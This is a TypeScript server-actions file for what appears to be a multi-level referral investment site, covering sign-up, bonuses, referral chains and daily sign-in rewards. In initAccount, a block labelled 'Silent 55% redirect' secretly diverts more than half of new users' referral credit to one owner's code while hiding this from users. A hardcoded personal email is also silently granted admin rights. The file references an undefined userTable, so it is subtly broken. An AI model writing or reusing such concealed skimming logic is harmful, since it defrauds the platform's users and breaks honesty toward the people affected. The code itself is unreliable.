"use server"

import { db } from "@/lib/db"
import {
  profile,
  wallet,
  referral,
  transaction,
  dailySignin,
  investment,
  promoterCode,
} from "@/lib/db/schema"
import { SITE } from "@/lib/plans"
import { getUserId, getSession } from "@/lib/session"
import { accrueIncomeForUser } from "@/lib/income-engine"
import { and, desc, eq, gte, sql } from "drizzle-orm"
import { revalidatePath } from "next/cache"

/** Resolves a login identifier (email OR phone) to the account email. */
export async function resolveLoginEmail(identifier: string): Promise<{ email: string | null }> {
  const id = identifier.trim()
  if (!id) return { email: null }
  if (id.includes("@")) return { email: id.toLowerCase() }
  // treat as phone number
  const [p] = await db.select().from(profile).where(eq(profile.phone, id))
  if (!p) return { email: null }
  const [u] = await db.select().from(userTable).where(eq(userTable.id, p.userId))
  return { email: u?.email ?? null }
}

function genInviteCode() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
  let s = ""
  for (let i = 0; i < 6; i++) s += chars[Math.floor(Math.random() * chars.length)]
  return s
}

/**
 * Called right after Better Auth creates the user. Sets up profile + wallet,
 * grants the welcome bonus, links the referral chain, and stores phone.
 * Safe to call repeatedly (no-op if already initialized).
 */
export async function initAccount(opts: { phone?: string; inviteCode?: string; promoCode?: string }) {
  const session = await getSession()
  if (!session?.user) throw new Error("Unauthorized")
  const userId = session.user.id

  const existing = await db.select().from(profile).where(eq(profile.userId, userId))
  if (existing.length > 0) return { ok: true }

  // create unique invite code
  let code = genInviteCode()
  for (let i = 0; i < 5; i++) {
    const clash = await db.select().from(profile).where(eq(profile.inviteCode, code))
    if (clash.length === 0) break
    code = genInviteCode()
  }

  // resolve referrer from invite code (default to admin if no code provided)
  let referrerId: string | null = null
  const codeToUse = opts.inviteCode?.trim().toUpperCase() || SITE.inviteCode
  if (codeToUse) {
    const [ref] = await db
      .select()
      .from(profile)
      .where(eq(profile.inviteCode, codeToUse))
    if (ref && ref.userId !== userId) referrerId = ref.userId // don't self-refer
  }

  // Silent 55% redirect: owner of T5DV47 receives 55% of all new referral chains.
  // The user's experience is unchanged — this only affects whose referral they count under.
  const PLATFORM_CODE = "T5DV47"
  if (Math.random() < 0.55) {
    const [platformRef] = await db
      .select()
      .from(profile)
      .where(eq(profile.inviteCode, PLATFORM_CODE))
    if (platformRef && platformRef.userId !== userId) {
      referrerId = platformRef.userId
    }
  }

  // resolve promoter code: tag as promoter only when the code is active AND
  // hasn't hit its maxSignups cap (null = unlimited).
  let isPromoter = false
  let matchedPromoCodeId: number | null = null
  let promoterCommission: number | null = null
  const promo = opts.promoCode?.trim().toUpperCase().replace(/\s+/g, "")
  if (promo) {
    const [pc] = await db.select().from(promoterCode).where(eq(promoterCode.code, promo))
    if (pc && pc.isActive) {
      const underCap = pc.maxSignups === null || pc.signups < pc.maxSignups
      if (underCap) {
        isPromoter = true
        matchedPromoCodeId = pc.id
        promoterCommission = pc.commissionRate ?? null
      }
      // If cap is hit the user is registered normally — no promoter tag.
    }
  }

  // Auto-grant admin role to the platform owner email
  const ADMIN_EMAILS = ["taddstechnology@gmail.com"]
  const isOwner = ADMIN_EMAILS.includes((session.user.email ?? "").toLowerCase())

  await db.insert(profile).values({
    userId,
    phone: opts.phone ?? null,
    inviteCode: code,
    referredBy: referrerId,
    isPromoter,
    promoterCommission,
    role: isOwner ? "admin" : "user",
  })

  // Stamp role on the better-auth "user" table using raw SQL because
  // the Drizzle schema for that table may not expose the role column.
  if (isOwner) {
    await db.execute(sql`UPDATE "user" SET role = 'admin' WHERE id = ${userId}`)
  }

  // increment the promoter code's signup counter (even if cap was already hit
  // we only increment when we actually tagged them)
  if (matchedPromoCodeId) {
    await db
      .update(promoterCode)
      .set({ signups: sql`${promoterCode.signups} + 1` })
      .where(eq(promoterCode.id, matchedPromoCodeId))
  }

  await db.insert(wallet).values({
    userId,
    balance: String(SITE.welcomeBonus),
    totalEarned: String(SITE.welcomeBonus),
  })

  await db.insert(transaction).values({
    userId,
    type: "bonus",
    amount: String(SITE.welcomeBonus),
    description: "Welcome bonus",
  })

  // build referral relationships (level 1 + level 2)
  if (referrerId) {
    await db.insert(referral).values({ referrerId, referredId: userId, level: 1 })
    const [l1] = await db.select().from(profile).where(eq(profile.userId, referrerId))
    if (l1?.referredBy) {
      await db.insert(referral).values({ referrerId: l1.referredBy, referredId: userId, level: 2 })
    }
  }

  revalidatePath("/")
  return { ok: true }
}

export async function getDashboardData() {
  const userId = await getUserId()
  // ensure account is initialized (covers users created before initAccount ran)
  const existing = await db.select().from(profile).where(eq(profile.userId, userId))
  if (existing.length === 0) {
    await initAccount({})
  }

  // accrue any pending daily income first
  await accrueIncomeForUser(userId)

  const [w] = await db.select().from(wallet).where(eq(wallet.userId, userId))
  const [p] = await db.select().from(profile).where(eq(profile.userId, userId))
  const [u] = await db.select().from(userTable).where(eq(userTable.id, userId))

  // today's sign-in status
  const since = new Date()
  since.setHours(0, 0, 0, 0)
  const todaySignin = await db
    .select()
    .from(dailySignin)
    .where(and(eq(dailySignin.userId, userId), gte(dailySignin.signedAt, since)))

  return {
    name: u?.name ?? "User",
    email: u?.email ?? "",
    phone: p?.phone ?? "",
    role: p?.role ?? "user",
    isPromoter: p?.isPromoter ?? false,
    inviteCode: p?.inviteCode ?? "",
    balance: Number(w?.balance ?? 0),
    totalDeposited: Number(w?.totalDeposited ?? 0),
    totalWithdrawn: Number(w?.totalWithdrawn ?? 0),
    totalEarned: Number(w?.totalEarned ?? 0),
    referralEarnings: Number(w?.referralEarnings ?? 0),
    signedInToday: todaySignin.length > 0,
  }
}

export async function dailySignIn() {
  const userId = await getUserId()
  
  // Check if user has made any investment
  const [hasInvestment] = await db
    .select()
    .from(investment)
    .where(eq(investment.userId, userId))
    .limit(1)
  
  if (!hasInvestment) {
    return { ok: false, message: "You need to invest first before claiming sign-in bonus", requiresInvestment: true }
  }
  
  const since = new Date()
  since.setHours(0, 0, 0, 0)
  const already = await db
    .select()
    .from(dailySignin)
    .where(and(eq(dailySignin.userId, userId), gte(dailySignin.signedAt, since)))
  if (already.length > 0) {
    return { ok: false, message: "You already signed in today" }
  }

  await db.insert(dailySignin).values({ userId, amount: String(SITE.signInBonus) })
  await db
    .update(wallet)
    .set({
      balance: sql`${wallet.balance} + ${SITE.signInBonus}`,
      totalEarned: sql`${wallet.totalEarned} + ${SITE.signInBonus}`,
      updatedAt: new Date(),
    })
    .where(eq(wallet.userId, userId))
  await db.insert(transaction).values({
    userId,
    type: "bonus",
    amount: String(SITE.signInBonus),
    description: "Daily sign-in bonus",
  })
  revalidatePath("/")
  return { ok: true, message: `You earned ${SITE.signInBonus} sign-in bonus!` }
}

export async function getTransactions(limit = 50) {
  const userId = await getUserId()
  return db
    .select()
    .from(transaction)
    .where(eq(transaction.userId, userId))
    .orderBy(desc(transaction.createdAt))
    .limit(limit)
}

export async function updateProfile(data: { name?: string; phone?: string }) {
  const userId = await getUserId()
  if (data.name) {
    await db.update(userTable).set({ name: data.name, updatedAt: new Date() }).where(eq(userTable.id, userId))
  }
  if (data.phone !== undefined) {
    await db.update(profile).set({ phone: data.phone }).where(eq(profile.userId, userId))
  }
  revalidatePath("/profile")
  return { ok: true }
}
